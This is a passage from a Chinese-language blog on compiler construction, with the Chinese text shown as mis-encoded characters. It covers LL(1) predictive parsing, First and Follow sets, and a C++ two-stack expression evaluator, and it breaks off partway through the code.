<p>æ•´ä¸ªè¿‡ç¨‹ä¸­"è¾“å…¥id"ä¸€ç›´æ²¡å˜,ä¹Ÿå°±æ˜¯è¯´æŒ‡å‘è¾“å…¥ä¸²çš„æŒ‡é’ˆå§‹ç»ˆæ²¡æœ‰ç§»åŠ¨</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ–°åè¯"æ ¼å±€",å®é™…ä¸Šç±»ä¼¼äºçŠ¶æ€,å®ƒå—åˆ°å½“å‰æ ˆé¡¶,å½“å‰è¾“å…¥,é¢„æµ‹åˆ†æè¡¨ä¸‰è€…çš„å½±å“</p>
<blockquote>
<p>å®é™…ä¸Šå°±æ˜¯è¿ªæ°æ–¯ç‰¹æ‹‰åŒæ ˆç®—æ³•æ±‚è§£ç®—æ•°è¡¨è¾¾å¼çš„ç®—æ³•æ€æƒ³</p>
<p>ä¸æ–­å‹æ ˆç›´åˆ°æ ˆé¡¶å’Œå½“å‰ç¬¦å·åŒ¹é…å®é™…ä¸Šç»´æŠ¤äº†ä¸€ä¸ªå•è°ƒæ ˆ,è¶Šé è¿‘æ ˆé¡¶çš„ç¬¦å·ä¼˜å…ˆçº§è¶Šé«˜</p>
</blockquote>
<h4 id="å¦‚ä½•å®šä¹‰æ ¼å±€">å¦‚ä½•å®šä¹‰æ ¼å±€?</h4>
<p>è¡¨é©±åŠ¨çš„è¯æ³•åˆ†æå™¨ä¸­å®šä¹‰äº†ä¸€ä¸ªçŠ¶æ€,ç„¶åæ ¹æ®å½“å‰è¾“å…¥å’ŒçŠ¶æ€è½¬ç§»è¡¨è¿™é‡Œä¸¤ä¸ªå› ç´ ,ä»å½“å‰çŠ¶æ€è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªçŠ¶æ€</p>
<p>å¯¹äºé¢„æµ‹åˆ†æè¡¨é©±åŠ¨çš„è¯­æ³•åˆ†æå™¨,å®šä¹‰äº†ä¸€ä¸ªç±»ä¼¼çŠ¶æ€çš„ä¸œè¥¿å«åš"æ ¼å±€",</p>
<p>åŒºåˆ«äºçŠ¶æ€è½¬ç§»,æ ¼å±€è½¬æ¢æ—¶éœ€è¦è€ƒè™‘å½“å‰æ ˆé¡¶,é¢„æµ‹åˆ†æè¡¨,å½“å‰è¾“å…¥ç¬¦å·,å…±3ä¸ªå› ç´ </p>
<p>å®é™…ä¸Šæ ¼å±€å˜åŒ–æ˜¯çŠ¶æ€è½¬ç§»çš„æ¨å¹¿</p>
<p>çŠ¶æ€è½¬ç§»æ—¶ç»´æŠ¤ä¸€ä¸ªæ ˆå½“æ‘†è®¾å°±æˆäº†æ ¼å±€å˜åŒ–</p>
<h4 id="æ ¼å±€å¦‚ä½•è½¬ç§»">æ ¼å±€å¦‚ä½•è½¬ç§»?</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">è®¾ç½®ipä½¿å®ƒæŒ‡å‘wçš„ç¬¬ä¸€ä¸ªç¬¦å·ï¼Œå…¶ä¸­ip æ˜¯è¾“å…¥æŒ‡é’ˆï¼›</span><br><span class="line">ä»¤X=æ ˆé¡¶ç¬¦å·ï¼›</span><br><span class="line"><span class="keyword">while</span>  ( X â‰  ï¼„ )ï½›     /   *      æ ˆéç©º */ </span><br><span class="line">            <span class="keyword">if</span> ( X ç­‰äºipæ‰€æŒ‡å‘çš„ç¬¦å·a) æ‰§è¡Œæ ˆçš„å¼¹å‡ºæ“ä½œï¼Œå°†ipå‘å‰ç§»åŠ¨ä¸€ä¸ªä½ç½®ï¼›</span><br><span class="line">            <span class="keyword">else</span>  <span class="keyword">if</span> ( Xæ˜¯ä¸€ä¸ªç»ˆç»“ç¬¦å·)  error ( ) ;</span><br><span class="line">            <span class="keyword">else</span>  <span class="keyword">if</span> ( M[Xï¼Œa]æ˜¯ä¸€ä¸ªæŠ¥é”™æ¡ç›®)  error ( ) ;           </span><br><span class="line">            <span class="keyword">else</span>  <span class="keyword">if</span> ( M[Xï¼Œa] = X â†’Y1Y2 â€¦ Yk  )ï½› </span><br><span class="line">                         è¾“å‡ºäº§ç”Ÿå¼ X â†’Y1Y2 â€¦ Yk  ï¼›</span><br><span class="line">                         å¼¹å‡ºæ ˆé¡¶ç¬¦å·ï¼›</span><br><span class="line">                        å°†Ykï¼ŒYk<span class="number">-1</span> â€¦ï¼ŒYi å‹å…¥æ ˆä¸­ï¼Œå…¶ä¸­Y1ä½äºæ ˆé¡¶ã€‚</span><br><span class="line">            &#125;</span><br><span class="line">            ä»¤X=æ ˆé¡¶ç¬¦å·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé¢M[X,a]å°±æ˜¯å½“å‰æ ˆé¡¶ä¸ºX,å½“å‰ç¬¦å·ä¸ºaæ—¶æŸ¥è¡¨èƒ½å¤Ÿè½¬ç§»åˆ°çš„ä¸‹ä¸€ä¸ªæ ¼å±€</p>
<p>åŒ¹é…id+id*idçš„æ•´ä¸ªè¿‡ç¨‹å¦‚å›¾</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221109215743134.png"
alt="image-20221109215743134" />
<figcaption aria-hidden="true">image-20221109215743134</figcaption>
</figure>
<p>è¯­æ³•åˆ†æé˜¶æ®µä¸ç®¡æ˜¯é€’å½’ä¸‹é™è¿˜æ˜¯é¢„æµ‹åˆ†æ,å…¶ç›®çš„ç›¸åŒ</p>
<p>1.é¦–å…ˆæ£€æŸ¥æœ‰æ²¡æœ‰è¯­æ³•é”™è¯¯.</p>
<p>2.ç»™å‡ºæŠ½è±¡è¯­æ³•æ ‘.</p>
<p>é€’å½’ä¸‹é™æ³•è‡ªé¡¶å‘ä¸‹å»ºç«‹æŠ½è±¡è¯­æ³•æ ‘æ˜¯è‡ªç„¶è€Œç„¶çš„</p>
<p>é¢„æµ‹åˆ†ææ³•æ€ä¹ˆå»ºç«‹æŠ½è±¡è¯­æ³•æ ‘å‘¢?</p>
<p>ä¸€æ—¶é—´ç«Ÿæƒ³ä¸åˆ°</p>
<p>èšŒåŸ ä½äº†</p>
<h4 id="å¦‚ä½•å»ºç«‹é¢„æµ‹åˆ†æè¡¨">å¦‚ä½•å»ºç«‹é¢„æµ‹åˆ†æè¡¨?</h4>
<p>é¢„æµ‹åˆ†æå™¨ç®—æ³•å’Œæ–‡æ³•å®šä¹‰æ²¡æœ‰å…³ç³»,æ–‡æ³•å®šä¹‰ä½“ç°åœ¨é¢„æµ‹åˆ†æè¡¨ä¸Š</p>
<p>é¢„æµ‹åˆ†æå™¨çš„ç®—æ³•æ˜¯å†™æ­»çš„,ä½†æ˜¯é¢„æµ‹åˆ†æè¡¨æ˜¯æ´»çš„</p>
<h5 id="firsté›†åˆ">Firsté›†åˆ</h5>
<p><span class="math inline">\(First(\alpha)=\{a|\alpha\Rightarrow
a,a\in T\}\)</span>ä¹Ÿå°±æ˜¯<span
class="math inline">\(\alpha\)</span>å¯ä»¥æ¨å¯¼å‡ºçš„ä¸€ä¸ªéç»ˆç»“å­—ç¬¦çš„é›†åˆ,å¦‚æœ<span
class="math inline">\(\alpha\Rightarrow \epsilon\)</span>,åˆ™<span
class="math inline">\(\epsilon \in First(\alpha)\)</span></p>
<p><span class="math inline">\(First(E)=\{(,id,num\}\)</span></p>
<h5 id="followé›†åˆ">Followé›†åˆ</h5>
<p><span class="math display">\[
Follow(A)=\{a|S\Rightarrow ...Aa...,a\in T\}
\]</span></p>
<p>ç´§è·Ÿåœ¨éç»ˆç»“ç¬¦Aåé¢çš„ç»ˆç»“ç¬¦é›†åˆ</p>
<p><span class="math inline">\(Follow(E)=\{;,)\}\)</span></p>
<h5 id="ç®—æ³•æ±‚è§£firsté›†åˆ">ç®—æ³•æ±‚è§£Firsté›†åˆ</h5>
<p><span class="math display">\[
X\rightarrow \alpha_1|\alpha_2|...|\alpha_m,m\ge1\\First(X)=\cup
First(\alpha_i)
\]</span></p>
<p>éç»ˆç»“ç¬¦çš„Firsté›†åˆ,ç­‰äºå…¶æ‰€æœ‰æ¨å¯¼çš„Firsté›†åˆçš„å¹¶é›†</p>
<p>å¯¹äº<span class="math inline">\(First(\alpha_i)\)</span>çš„æ±‚æ³•:</p>
<p>å…¶ä¸­å¦‚æœ<span
class="math inline">\(\alpha_i=\epsilon\)</span>,åˆ™<span
class="math inline">\(\epsilon\in First(\alpha_i)\)</span></p>
<p>å¦åˆ™,å‡è®¾<span class="math inline">\(\alpha_i\Rightarrow
Y_1,Y_2,...,Y_n\)</span></p>
<p>å¦‚æœ<span class="math inline">\(Y1\)</span>å¯ä»¥æ¨å¯¼å‡º<span
class="math inline">\(\epsilon\)</span>,åˆ™Y2å°±æœ‰å¯èƒ½æˆä¸ºæœ€å‰é¢çš„,é‚£ä¹ˆå°±å¾—è€ƒè™‘<span
class="math inline">\(First(Y_2)\)</span></p>
<p>å¦‚æœ<span class="math inline">\(Y_1\)</span>æ¨å¯¼ä¸å‡º<span
class="math inline">\(\epsilon\)</span>,åˆ™Y2å°±è‚¯å®šä¸å¯èƒ½æˆä¸ºæœ€å‰é¢,å› æ­¤ä¸ç”¨è€ƒè™‘<span
class="math inline">\(First(Y_2)\)</span> <span class="math display">\[
First(\alpha_i)=\cup _{j=1}^k (First(Y_j)-\epsilon)
\]</span></p>
<p>å½“<span class="math inline">\(Y_k\)</span>æ¨å¯¼ä¸å‡º<span
class="math inline">\(\epsilon\)</span>æ—¶,æ‰ä¼šåœæ­¢jå¾€åéå†</p>
<h5 id="æ±‚è§£followé›†åˆ">æ±‚è§£Followé›†åˆ</h5>
<h3 id="ç®—æ•°è¡¨è¾¾å¼çš„é¢„æµ‹åˆ†æè¯­æ³•åˆ†æ">ç®—æ•°è¡¨è¾¾å¼çš„é¢„æµ‹åˆ†æè¯­æ³•åˆ†æ</h3>
<p><span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow Expression;Language|\epsilon\\
Expression&amp;\rightarrow Term\ Expression&#39;\\
Expression&#39;&amp;\rightarrow +Term\ Expression&#39;|\epsilon\\
Term&amp;\rightarrow Factor \ Term&#39;\\
Term&#39;&amp;\rightarrow \times Factor\ Term&#39;|\epsilon\\
Factor&amp;\rightarrow (Expression)|-Factor|id
\end{aligned}
\]</span></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/10/17/%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">è¯æ³•åˆ†æ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-17 11:09:00" itemprop="dateCreated datePublished" datetime="2022-10-17T11:09:00+08:00">2022-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-15 10:12:52" itemprop="dateModified" datetime="2022-11-15T10:12:52+08:00">2022-11-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è¯æ³•åˆ†æå™¨">è¯æ³•åˆ†æå™¨</h1>
<h2 id="è¯æ³•åˆ†æå…ˆä¿®-è¡¨è¾¾å¼æ±‚å€¼">è¯æ³•åˆ†æå…ˆä¿®-è¡¨è¾¾å¼æ±‚å€¼</h2>
<p>æ±‚ä¸€ä¸ªåŒ…å«åŠ å‡ä¹˜é™¤ä¹˜æ–¹æ‹¬å·çš„è¡¨è¾¾å¼å€¼,è¦æ±‚è€ƒè™‘è¿ç®—ä¼˜å…ˆçº§</p>
<p>æ¯”å¦‚<code>1+2*3-(4+5)*6</code></p>
<h3 id="è¿ªæ°æ–¯ç‰¹æ‹‰åŒæ ˆæ³•">è¿ªæ°æ–¯ç‰¹æ‹‰åŒæ ˆæ³•</h3>
<p>åŒæ ˆ,ä¸€ä¸ªç”¨äºå­˜æ”¾æ“ä½œæ•°<code>stack&lt;double&gt; operands</code>,ä¸€ä¸ªç”¨äºå­˜æ”¾è¿ç®—ç¬¦<code>stack&lt;char&gt; operaotors</code></p>
<p>è¿ç®—ä¼˜å…ˆçº§é€šè¿‡ç»™æ¯ä¸ªè¿ç®—ç¬¦å®šä¹‰æ ˆå†…å¤–ä¼˜å…ˆçº§æ¥ä½“ç°:</p>
<p>æ•™æç»™å‡ºçš„ä¼˜å…ˆçº§å®šä¹‰æ˜¯:</p>
<p>icp,æ ˆå¤–ä¼˜å…ˆçº§</p>
<p>isp,æ ˆå†…ä¼˜å…ˆçº§</p>
<table>
<thead>
<tr>
<th>ä¼˜å…ˆçº§</th>
<th>(</th>
<th>+-</th>
<th>*/</th>
<th>)</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ ˆå†…ä¼˜å…ˆçº§isp</td>
<td>1</td>
<td>3</td>
<td>5</td>
<td>8</td>
</tr>
<tr>
<td>æ ˆå¤–ä¼˜å…ˆçº§icp</td>
<td>8</td>
<td>2</td>
<td>4</td>
<td>1</td>
</tr>
</tbody>
</table>
<h4 id="åŒæ ˆç®—æ³•">åŒæ ˆç®—æ³•</h4>
<p>å¯¹äºä¸€ä¸ªæ“ä½œæ•°,ç›´æ¥å‹å…¥operandsæ ˆ</p>
<p>å¯¹äºä¸€ä¸ªè¿ç®—ç¬¦c,</p>
<p>1.å¦‚æœå…¶æ ˆå¤–ä¼˜å…ˆçº§æ¯”ç¬¦å·æ ˆæ ˆé¡¶è¿ç®—ç¬¦çš„æ ˆå†…ä¼˜å…ˆçº§è¦é«˜,åˆ™cå…¥ç¬¦å·æ ˆ,å³</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(operators.empty()||icp(c)&gt;isp(operators.top()))&#123;</span><br><span class="line">    operators.push(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.å¦‚æœå…¶æ ˆå¤–ä¼˜å…ˆçº§æ¯”ç¬¦å·æ ˆæ ˆé¡¶ä¼˜å…ˆçº§ä½,åˆ™é¦–å…ˆè¦ç¬¦å·æ ˆå¼¹æ ˆ,æ¯æ¬¡å¼¹å‡ºä¸€ä¸ªç¬¦å·,é¡ºå¸¦å¼¹å‡ºä¸¤ä¸ªæ“ä½œæ•°æ ˆçš„æ•°,æ ¹æ®è¯¥ç¬¦å·å¯¹è¿™ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡Œè¿ç®—ä¹‹åå°†è¿ç®—ç»“æœé‡æ–°å‹å…¥æ“ä½œæ•°æ ˆ.å¦‚æ­¤ç›´åˆ°ç¬¦å·æ ˆé¡¶çš„æ ˆå†…ä¼˜å…ˆçº§å°äºcçš„æ ˆå¤–ä¼˜å…ˆçº§æ—¶,cå‹æ ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!operators.empty()&amp;&amp;icp(c)&lt;isp(operators.top()))&#123;</span><br><span class="line">	<span class="keyword">while</span>(!operators.empty()&amp;&amp;icp(c)&lt;isp(operators.top()))&#123;</span><br><span class="line">        op=operators.top();</span><br><span class="line">        operators.pop();</span><br><span class="line">		<span class="keyword">if</span>(operands.size()&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">			first=operands.top();</span><br><span class="line">			operands.pop();</span><br><span class="line">			second=operands.top();</span><br><span class="line">			operands.pop();</span><br><span class="line">            operands.push(basic_operate(op,first,second));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> error</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span>(operators.empty()||icp(c)&gt;isp(operators.top()))&#123;</span><br><span class="line">        operators.push(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//icp(c)==isp(operators.top())çš„æƒ…å†µ,è§3</span></span><br><span class="line">        operators.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.å¦‚æœç¬¦å·æ ˆé¡¶çš„æ ˆå†…ä¼˜å…ˆçº§ç­‰äºcçš„æ ˆå¤–ä¼˜å…ˆçº§,ç›´æ¥ç¬¦å·æ ˆé€€æ ˆä¸€ä¸ª,cä¹Ÿä¸€å¹¶æ‰”æ‰.</p>
<p>å¦‚æœ2ä¸­å‘ç”Ÿäº†ç¬¦å·æ ˆé€€æ ˆåˆ°æŸæ—¶,ç¬¦å·æ ˆé¡¶çš„æ ˆå†…ä¼˜å…ˆçº§ç­‰äºcçš„æ ˆå¤–ä¼˜å…ˆçº§,ä¹Ÿæ˜¯å°†æ ˆé¡¶å’Œcéƒ½æ‰¬äº†</p>
<p>è¿™æ˜¯å› ä¸ºé‡åˆ°äº†æ‹¬å·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(icp(c)==isp(operators.top()))&#123;</span><br><span class="line">	operators.pop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´ä»£ç ">å®Œæ•´ä»£ç </h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// string expression;</span></span><br><span class="line"><span class="comment">// int pos;</span></span><br><span class="line"><span class="type">int</span> Invalid;<span class="comment">//å¤±æ•ˆæ ‡å¿—</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">icp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//æ ˆå¤–ä¼˜å…ˆçº§</span></span><br><span class="line">    <span class="type">int</span> priority=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            priority=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            priority=<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            priority=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            priority=<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> priority;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">isp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//æ ˆå†…ä¼˜å…ˆçº§</span></span><br><span class="line">    <span class="type">int</span> priority=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            priority=<span class="number">3</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            priority=<span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            priority=<span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            priority=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> priority;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">char</span>&gt; operators;<span class="comment">//æ“ä½œæ•°æ ˆ</span></span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">double</span>&gt; operands;<span class="comment">//è¿ç®—ç¬¦æ ˆ</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">basic_operate</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;op,<span class="type">const</span> <span class="type">double</span> &amp;first,<span class="type">const</span> <span class="type">double</span> &amp;second)</span>&#123;<span class="comment">//æ ¹æ®opè¿ç®—ç¬¦è®¡ç®—first op secondçš„å€¼</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            result=first+second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            result=first-second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            result=first*second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            result=first/second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">removeBlank</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;<span class="comment">//åˆ é™¤strä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">exp</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> c:str)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">exp</span>+=c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDigit</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—</span></span><br><span class="line">    <span class="keyword">return</span> c&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;9&#x27;</span>||c==<span class="string">&#x27;.&#x27;</span>;</span><br><span 